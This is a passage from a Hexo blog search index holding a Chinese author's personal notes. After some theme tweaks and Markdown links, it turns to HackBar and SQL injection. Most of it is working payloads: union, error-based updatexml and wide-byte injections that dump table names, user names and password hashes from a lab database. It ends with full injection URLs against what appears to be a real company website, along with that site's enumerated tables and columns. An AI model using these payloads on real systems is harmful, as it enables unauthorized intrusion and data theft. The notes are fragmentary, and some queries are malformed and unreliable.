class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;链接&quot;</span>&gt;</span>名字<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span>下方简单描述 <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- 这是HTML的注释 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>E:\BOKE\hexo_blog\themes\next\source\css\_variables\base.styl<br>菜单栏以及侧边任务栏修改颜色</p>
<p>markdown语法的文档</p>
<p><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet</a> </p>
<p>官网可实行在线编辑</p>
<p><a href="https://markdown.com.cn/basic-syntax/">Markdown 基本语法 | Markdown 官方教程</a> </p>
<p>SQL hacker bar使用</p>
<ol>
<li>Load URL:复制网址</li>
<li>Split URL:剪切地址</li>
<li>Encyption:四种加密方式</li>
<li>Encoding:三种编码方式</li>
<li>SQL:一些方便查询的语句</li>
<li>1 eg:字段数是10的时候，我们需要手动打出and 1&#x3D;2 unionselect1，2，3，4，5，6，7，8，9，10，这样做会很麻烦。我们通过hackbar的SQL选项里面的union select statement在其中输入字段数，hackbar会自动的帮助我们输入那一大串文字</li>
<li>xss:XSS攻击</li>
<li>Post data:以post的方式提交数据</li>
</ol>
<p>简单的CTF登录题目可以尝试    ‘or 1&#x3D;1 #</p>
<p>and（有假则假  1表示真，0表示假）<br>1 and 1 &#x3D; 1<br>1 and 0 &#x3D; 0<br>0 and 0 &#x3D; 0</p>
<p>or(有真则真  1表示真，0表示假)<br>1 or 1 &#x3D; 1<br>1 or  0 &#x3D;1<br>0 or 0 &#x3D;0</p>
<p>xor(异或，相同为0，相异为1，0和其他任意不为0值进行异或结果都为1，除了0之外的其他相异的数进行异或结果都为0)<br>1 xor 1 &#x3D;0<br>0 xor 1 &#x3D;1<br>0 xor 0 &#x3D;0<br>8 xor 7 &#x3D;0<br>0 xor 7 &#x3D;1</p>
<p>截取函数：<br>left（‘admin’,1）:左截取，从左边截取admin字符串，截取一位。<br>right（’admin’,1）：右截取<br>mid（’admin’,1,2）：截取admin字符串，从第一位开始截取，截取两位<br>substr（’admin’,1,1）：<br>substring（’admin’,1,1）：</p>
<p>判断函数：<br>if（1&#x3D;1，1，0）:<br>case when 1&#x3D;1 then 0 else 1 end:</p>
<p>当前数据库：mozhe_discuz_stormgroup<br>information_schema<br>表名：notice(id,title,content,time)，stormgroup_member(id,name,password,status)</p>
<p>‘ union select 1,2,3,4–+</p>
<p>‘ union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;’mozhe_discuz_stormgroup’–+</p>
<p>‘ union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;’stormgroup_member’–+</p>
<p>‘ union select 1,name,password,4 from stormgroup_member–+</p>
<p>‘and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’member’ limit 0,1),0x7e),1)&#x3D;’1–+</p>
<p>name password status</p>
<p>‘and updatexml(1,concat(0x7e,(select status from member limit 0,1),0x7e),1)&#x3D;’1–+   0   1<br>‘and updatexml(1,concat(0x7e,(select name from member limit 1,1),0x7e),1)&#x3D;’1–+    mozhe<br>‘and updatexml(1,concat(0x7e,(select password from member limit 1,1),0x7e),1)&#x3D;’1–+   ~10d4fd8b49ca62d2d43e561965e81ce</p>
<p>截取31位后面的密码</p>
<p>right(select group_concat(password) from member),4)</p>
<p>‘ and updatexml(1,concat(0x7e,(right((select group_concat(password) from member),4)),0x7e),1)&#x3D;’1–+   ‘<del>1ce8</del>‘</p>
<p>‘ and updatexml(1,concat(0x7e,(select substr(password,32,1) from member limit 0,1),0x7e),1)–+</p>
<p>‘ and updatexml(1,concat(0x7e,(select substr(password,32,1) from member limit 1,1),0x7e),1)–+</p>
<p>宽字节注入 1%df’ ………  –+</p>
<p>1%df’and updatexml(1,concat(0x7e,database(),0x7e),1)–+           ‘<del>mozhe_discuz_stormgroup</del>‘   库</p>
<p>1%df’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+ </p>
<p>XPATH syntax error: ‘<del>notice,stormgroup_member</del>‘</p>
<p>73746f726d67726f75705f6d656d626572</p>
<p>1%df’and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x73746f726d67726f75705f6d656d626572),0x7e),1)–+ </p>
<p>XPATH syntax error: ‘<del>name,password,status</del>‘<br>6e616d65 70617373776f7264 737461747573</p>
<p>1%df’and updatexml(1,concat(0x7e,(select group_concat(status) from information_schema.columns where table_name&#x3D;0x737461747573),limit 0,1)0x7e),1)–+ </p>
<p>1%df’and updatexml(1,concat(0x7e,right((select group_concat(password) from stormgroup_member ),1),0x7e),1)–+</p>
<p>XPATH syntax error: ‘<del>c</del>‘</p>
<p>order br 5<br>union select 1,2,database(),version()</p>
<p>表明 pentesterlab</p>
<p>sleep()&#x3D;&#x3D;&gt;反应时间</p>
<p><a href="http://www.shouyaoholding.com/new_details.php?id=1%20order%20by%2013--+">http://www.shouyaoholding.com/new_details.php?id=1%20order%20by%2013--+</a></p>
<p><a href="http://www.shouyaoholding.com/new_details.php?id=-1%20union%20select%201,2,database(),4,5,6,group_concat(table_name),8,9,10,11,12,13%20%20from%20information_schema.tables%20where%20table_schema=%27shouyao%27--+--+">http://www.shouyaoholding.com/new_details.php?id=-1%20union%20select%201,2,database(),4,5,6,group_concat(table_name),8,9,10,11,12,13%20%20from%20information_schema.tables%20where%20table_schema=%27shouyao%27--+--+</a></p>
<p>库    shouyao<br>表    banner,busniess_user,company,contact,innovation,news,recruit,reports,resources,resume,resume_copy1<br>列    resources(id,type,title,thumb,desc,desc2,add_time,detail,status,top)</p>
<p>group_concat(column_name)     information_schema.columns where table_name&#x3D;’resources’</p>
<p><a href="http://www.shouyaoholding.com/new_details.php?id=-1%20union%20select%201,2,database(),4,5,6,group_concat(column_name),8,9,10,11,12,13%20%20from%20information_schema.columns">http://www.shouyaoholding.com/new_details.php?id=-1%20union%20select%201,2,database(),4,5,6,group_concat(column_name),8,9,10,11,12,13%20%20from%20information_schema.columns</a> where table_name&#x3D;’resources’–+</p>
<p><a href="http://www.shouyaoholding.com/new_details.php?id=-1%20union%20select%201,2">http://www.shouyaoholding.com/new_details.php?id=-1%20union%20select%201,2</a>,(select group_concat(id) from resources),4,5,6,group_concat(column_name),8,9,10,11,12,13%20%20from%20information_schema.columns where table_name&#x3D;’resources’–+</p>
]]></content>
      <tags>
        <tag>友链links</tag>
      </tags>
  </entry>
</search>
